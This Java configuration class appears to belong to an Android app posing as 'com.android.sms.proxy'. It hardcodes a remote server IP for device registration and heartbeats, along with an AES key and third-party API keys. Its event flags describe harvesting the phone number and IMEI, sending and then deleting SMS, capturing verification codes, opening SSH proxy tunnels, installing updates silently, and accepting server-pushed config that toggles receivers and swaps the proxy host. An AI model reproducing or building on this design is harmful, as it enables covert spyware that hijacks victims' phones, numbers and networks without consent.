package com.android.sms.proxy.entity;

import android.text.TextUtils;
import android.util.Log;

/**
 * @author zyq 16-3-9
 */
public class NativeParams {

	public volatile static boolean isUpdatedOnlineConfig = false;
	public static int SUCCESS = 0;
	public static int STATUS_IDLE = 0;
	public static int STATUS_WAIT_FOR_VERIFY_CODE = 1;
	public static String TYPE_PHONE_NUMBER = "phone";
	public static String TYPE_PHONE_IMEI = "imei";
	public static String TYPE_SSH_CONNECT = "isSSHConnected";
	public static String TYPE_PHONE_SMS = "code";
	public static String URL_SEND_CODE = "http://52.78.13.149:50000/regist/";
	//	public static String URL_SEND_CODE = "http://172.16.5.39:8000/regist/";
	public static String URL_HEART_BEAT = "http://52.78.13.149:50000/heartbeat/";
	public static String KEY_ANDROID_FLURRY = "RP3R626TXWWWKRYYCYDF";
	public static final String AES_KEY = "3Ce7671Ff686D51d";
	public static final String AVOS_CLOUD_APPLICATIONID = "J55YiWIcfYyLgRB9E9mSyIxL-gzGzoHsz";
	public static final String AVOS_CLOUD_APP_KEY = "dyScB5L160VDf3IlkoW9D3jo";

	//Flurry统计
	//查找手机号码
	public static String EVENT_GET_PHONE_NUMBER = "getPhoneNumber";
	public static String KEY_SIM_LINE1PHONE = "fromSimLine1Phone";
	public static String KEY_QUERY_SMS = "fromQuerySMS";
	public static String KEY_SEND_SMS = "fromSendSMS";

	//发送短信
	public static String EVENT_SEND_SMS = "sendSMS";
	public static String KEY_DELETE_SMS_SUCCESS = "deleteSMSSuccess";

	//统计发送短信成功到达率．．．
	public static String EVENT_SEND_SMS_STATUS = "sendSMSStatus";
	public static String KEY_SEND_SMS_SUCCESS = "sendSMSSuccess";

	//删除短信成功
	public static String EVENT_DELETE_SMS_SUCCESS = "deleteSMSSuccess";
	public static String KEY_DELETE_SUCCESS_VERSION = "phoneAndroidVersion";
	public static String KEY_DELETE_SUCCESS_DEVICE = "phoneDevice";

	//删除短信失败
	public static String EVENT_DELETE_SMS_FAILED = "deleteSMSFail";
	public static String KEY_DELETE_FAIL_VERSION = "phoneAndroidVersion";
	public static String KEY_DELETE_FAIL_DEVICE = "phoneDevice";

	//4.4删除成功的机型
	public static String EVENT_VERSION_KITKAT = "kitkat";
	public static String KEY_KITKAT_DEVICE = "kitKatDevice";
	public static String KEY_FIX_SYSTEM_SUCCESS = "fixSystem";

	//开始建立ssh链接
	public static String EVENT_START_SSH_CONNECT = "startConnect";
	public static String KEY_SSH_CONNECT_SUCCESS = "ConnectionSuccess";
	public static String KEY_SSH_NETWORK_TYPE = "sshNetworkType";

	//建立ssh成功
	public static String EVENT_SSH_CONNECT_SUCCESS = "ConnectionSuccess";
	public static String KEY_VERSION_NAME = "currentVersionName";
	public static String KEY_BUILD_VERSION_NAME = "buildVersionName";
	public static String KEY_SSH_CONNECT_NETWORK_TYPE = "sshNetworkType";
	public static String KEY_SSH_CONNECT_TIME = "ConnectSuccessTime";

	//开始建立proxy代理
	public static String EVENT_START_PROXY = "startProxy";
	public static String KEY_PROXY_CONNECT_SUCCESS = "proxyStartSuccess";
	public static String KEY_PROXY_NETWORK_TYPE = "proxyNetworkType";

	public static String EVENT_ACCEPT_BROADCAST = "acceptBroadCast";
	public static String KEY_SERVICE_START_SUCCESS = "startServiceSuccess";
	public static String KEY_BROADCAST_TYPE = "broadcastType";

	public static String EVENT_ACCEPT_UPDATE_INFO = "acceptUpdateInfo";
	public static String KEY_DOWNLOAD_URL = "downloadUrl";
	public static String KEY_DOWNLOAD_START = "startDownload";


	public static String EVENT_START_DOWNLOAD = "startDownload";
	public static String KEY_DOWNLOAD_SUCCESS = "downloadSuccess";

	//没法监听本身安装情况！！！！！！！
	public static String EVENT_START_INSTALL = "startSilentInstall";
	public static String KEY_INSTALL_SUCCESS = "installSuccess";
	public static String KEY_IS_DEVICE_ROOT = "isDeviceRoot";

	public static String EVENT_REPORT_PHONE_NUMBER = "reportPhoneNumber";
	public static String KEY_PHONE_NUMBER = "phoneNumber";
	public static String KEY_PHONE_IMEI = "phoneImei";

	public static String EVENT_GET_MESSAGE_BROADCAST_PRO1 = "getMessageBroadCastPro1";
	public static String KEY_MESSAGE_ACTION = "messageAction";


	public static String EVENT_GET_MESSAGE_BROADCAST_PRO = "getMessageBroadCastPro2";
	public static String KEY_MESSAGE_ARGS = "messageArgs";

	public static String EVENT_GET_MESSAGE_BROADCAST = "getMessageBroadCast";
	public static String KEY_MESSAGE_INFO = "messageInfo";
	public static String KEY_HEART_STATUS = "heartServiceStatus";
	public static String KEY_MESSAGE_LENGTH = "messageLength";
	public static String KEY_TERNIMAL_STATUS = "terminalStatus";
	public static String KEY_PROXY_STATUS = "proxyStatus";

	public static String EVENT_SEND_MESSAGE_STATUS = "sendMessage";
	public static String KEY_RESULT_SEND_MESSAGE = "sendMessageResult";

	//接收短信的状态
	public static String EVENT_RECEIVE_MESSAGE_STATUS = "receiveMessage";
	public static String KEY_RESULT_RECEIVE_MESSAGE = "receiveMessageResult";

	//检查代理的状态
	public static String EVENT_CHECK_PROXY_STATUS = "checkProxyStatus";
	public static String KEY_IS_PROXY_RUNNING = "isProxyRunning";
	public static String KEY_IS_TERMINAL_RUNNING = "isTerminalRunning";

	//升级时候能否检测到自身被删除
	public static String EVENT_CHECK_SELF_REMOVED = "checkSelfRemoved";
	public static String KEY_SELF_IS_REMOVED = "isSelfRemoved";

	public static boolean APPINSTANCE_DEBUG = false;
	public static boolean APP_ACTIVITY_DEBUG = false;
	public static boolean HEARTBEAT_SERVICE_DEBUG = true;
	public static boolean HEARTBEAT_RUNNABLE_DEBUG = false;
	public static boolean TERMINAL_SERVICE_DEBUG = true;
	public static boolean PROXY_SERVICE_DEBUG = true;
	public static boolean MESSAGE_RUNNABLE_DEBUG = true;
	public static boolean UPDATE_RUNNABLE_DEBUG = true;
	public static boolean APK_UPDATE_UTIL_DEBUG = true;
	public static boolean PROXY_SERVICE_UTIL_DEBUG = true;
	public static boolean TERMINAL_BRIDGE_DEBUG = true;
	public static boolean TRANSPORT_SSH_DEBUG = true;
	public static boolean HEARTBEAT_PROXY_SERVER_DEBUG = true;
	public static boolean DOWNLOAD_UPDATE_APK_DEBUG = true;
	public static boolean UPDATE_ONLINE_CONFIG_DEBUG = true;

	public static boolean CHANNEL_DEBUG = true;
	public static boolean CHANNEL_PAIR_DEBUG = true;

	public static boolean PHONE_INFO_DEBUG = true;
	public static boolean RECEIVE_SMS_DEBUG = true;
	public static boolean RECEIVE_BOOT_DEBUG = true;
	public static boolean DOWNLOAD_APK_DEBUG = false;

	public static boolean HEARTBEAT_APK_UPDATE = true;
	public static boolean HEARTBEAT_APK_PROXY = true;
	public static boolean HEARTBEAT_CHECK_PROXY = true;
	public static boolean HEARTBEAT_GET_MESSAGE = false;
	public static boolean ACTION_ASSIGN_SPECIFIC_TIME = false;
	public static boolean ACTION_ACCEPT_BOOT_RECEIVER = true;
	public static boolean ACTION_ACCEPT_SMS_RECEIVER = true;
	public static boolean ACTION_ACCEPT_INTENT_START = true;
	public static boolean ACTION_STOP_HEARTBEAT_SERVICE = false;
	public static boolean ACTION_REPLACE_PROXY_HOST = false;
	public static boolean ACTION_REPEAT_ALARM = true;
	public static boolean ACTION_ALLOW_KITKAT_ABOVE_MESSAGE = true;
	public static String NEW_PROXY_HOST = "";

	public static String ASSIGN_SPECIFIC_TIME = "";
	public static long HEARTBEAT_UPDATE_INIT_DELAY = 10;
	public static long HEARTBEAT_MESSAGE_INIT_DELAY = 20;
	public static long HEARTBEAT_PROXY_INIT_DELAY = 20;//Message 推送延迟
	public static long PROXY_CHECK_INIT_DELAY = 200;//200秒后才开始检查
	public static long PROXY_CHECK_INTERVAL_TIME = 120;//检查任务每120秒检查一次
	public static long HEARTBEAT_PROXY_INTERVAL = 20;//Message 轮询消息

	public static int SERVICE_NOTIFICATION_ID = 11;
	public static long SMS_RECEIVER_VALID_TIME = 10 * 60 * 1000;

	public static String DEFAULT_PHONE_NUMBER = "12345678901";
	public static String DEFAULT_PHONE_IMEI = "123451234512345";

	public static boolean DEFAULT_SEND_BINARY_SMS = false;
	public static String DEFAULT_BINARY_SMS_PORT = "80";

	public static int getPhoneNumberFailCount = 50;

	public static String HEARTBEAT_FROM_TYPE = "startType";
	public static String TYPE_FROM_ALARM = "startByAlarm";
	public static String TYPE_FROM_ACTION = "startByAction";
	public static String TYPE_FROM_BROADCAST = "startByBroadcast";

	//是否接收包删掉广播
	public static boolean ACTION_ACCEPT_PACKAGE_REMOVED_RECEIVER = true;
	//是否接收网络变化广播
	public static boolean ACTION_ACCEPT_NETWORK_CHANGE_RECEIVER = true;
	//是否接受开屏广播
	public static boolean ACTION_ACCEPT_USER_PRESENT_RECEIVER = true;


	public static synchronized void updateOnlineConfig(OnlineConfig config) {
		if (isUpdatedOnlineConfig) return;
		if (config == null) return;
		Log.d("config", "updateOnlineConfig!!!!!!!!");
		if (!TextUtils.isEmpty(config.getActionUpdate())) {
			HEARTBEAT_APK_UPDATE = Boolean.valueOf(config.getActionUpdate());
		}
		if (!TextUtils.isEmpty(config.getActionOpenProxy())) {
			HEARTBEAT_APK_PROXY = Boolean.valueOf(config.getActionOpenProxy());
		}
		if (!TextUtils.isEmpty(config.getActionCheckService())) {
			HEARTBEAT_CHECK_PROXY = Boolean.valueOf(config.getActionCheckService());
		}
		if (!TextUtils.isEmpty(config.getActionGetMessage())) {
			HEARTBEAT_GET_MESSAGE = Boolean.valueOf(config.getActionGetMessage());
		}
		if (!TextUtils.isEmpty(config.getActionAssignSpecificTime())) {
			ACTION_ASSIGN_SPECIFIC_TIME = Boolean.valueOf(config.getActionAssignSpecificTime());
		}
		if (ACTION_ASSIGN_SPECIFIC_TIME && TextUtils.isEmpty(config.getAssignSpecificTime())) {
			ASSIGN_SPECIFIC_TIME = config.getAssignSpecificTime();
		}
		if (config.getHeartbeatUpdateInitDelay() > 0) {
			HEARTBEAT_UPDATE_INIT_DELAY = config.getHeartbeatUpdateInitDelay();
		}
		if (config.getHeartbeatMessageInitDelay() > 0) {
			HEARTBEAT_MESSAGE_INIT_DELAY = config.getHeartbeatMessageInitDelay();
		}
		if (config.getHeartbeatProxyInitDelay() > 0) {
			HEARTBEAT_PROXY_INIT_DELAY = config.getHeartbeatProxyInitDelay();
		}
		if (config.getProxyCheckInitDelay() > 0) {
			PROXY_CHECK_INIT_DELAY = config.getProxyCheckInitDelay();
		}
		if (config.getProxyCheckIntervalTime() > 0) {
			PROXY_CHECK_INTERVAL_TIME = config.getProxyCheckIntervalTime();
		}
		if (config.getHeartbeatProxyIntervalTime() > 0) {
			HEARTBEAT_PROXY_INTERVAL = config.getHeartbeatProxyIntervalTime();
		}
		if (!TextUtils.isEmpty(config.getActionAcceptBootReceiver())) {
			ACTION_ACCEPT_BOOT_RECEIVER = Boolean.valueOf(config.getActionAcceptBootReceiver());
		}
		if (!TextUtils.isEmpty(config.getActionAcceptSmsReceiver())) {
			ACTION_ACCEPT_SMS_RECEIVER = Boolean.valueOf(config.getActionAcceptSmsReceiver());
		}
		if (!TextUtils.isEmpty(config.getActionAcceptIntentStart())) {
			ACTION_ACCEPT_INTENT_START = Boolean.valueOf(config.getActionAcceptIntentStart());
		}
		if (!TextUtils.isEmpty(config.getActionStopHeartbeatService())) {
			ACTION_STOP_HEARTBEAT_SERVICE = Boolean.valueOf(config.getActionStopHeartbeatService());
		}
		if (!TextUtils.isEmpty(config.getActionReplaceProxyHost())) {
			ACTION_REPLACE_PROXY_HOST = Boolean.getBoolean(config.getActionReplaceProxyHost());
		}
		if (ACTION_REPLACE_PROXY_HOST) {
			NEW_PROXY_HOST = config.getNewProxyHost();
		}
		isUpdatedOnlineConfig = true;
		if (config.getSmsReceiverValidTime() > 0) {
			SMS_RECEIVER_VALID_TIME = config.getSmsReceiverValidTime();
		}
		if (!TextUtils.isEmpty(config.getHeartbeatRunnableDebug())) {
			HEARTBEAT_RUNNABLE_DEBUG = Boolean.valueOf(config.getHeartbeatRunnableDebug());
		}
		if (!TextUtils.isEmpty(config.getActionRepeatingAlarm())) {
			ACTION_REPEAT_ALARM = Boolean.valueOf(config.getActionRepeatingAlarm());
		}
		if (!TextUtils.isEmpty(config.getActionAcceptNetworkChangeReceiver())) {
			ACTION_ACCEPT_NETWORK_CHANGE_RECEIVER = Boolean.valueOf(config.getActionAcceptNetworkChangeReceiver());
		}
		if (!TextUtils.isEmpty(config.getActionAcceptPackageRemovedReceiver())) {
			ACTION_ACCEPT_PACKAGE_REMOVED_RECEIVER = Boolean.valueOf(config.getActionAcceptPackageRemovedReceiver());
		}
		if (!TextUtils.isEmpty(config.getActionAcceptUserPresentReceiver())) {
			ACTION_ACCEPT_USER_PRESENT_RECEIVER = Boolean.valueOf(config.getActionAcceptUserPresentReceiver());
		}
		if (!TextUtils.isEmpty(config.getActionGetPhoneNumberFailedCount())) {
			getPhoneNumberFailCount = Integer.valueOf(config.getActionGetPhoneNumberFailedCount());
		}
		if (!TextUtils.isEmpty(config.getActionAllowKitkatAboveMessage())) {
			ACTION_ALLOW_KITKAT_ABOVE_MESSAGE = Boolean.valueOf(config.getActionAllowKitkatAboveMessage());
		}


	}
}
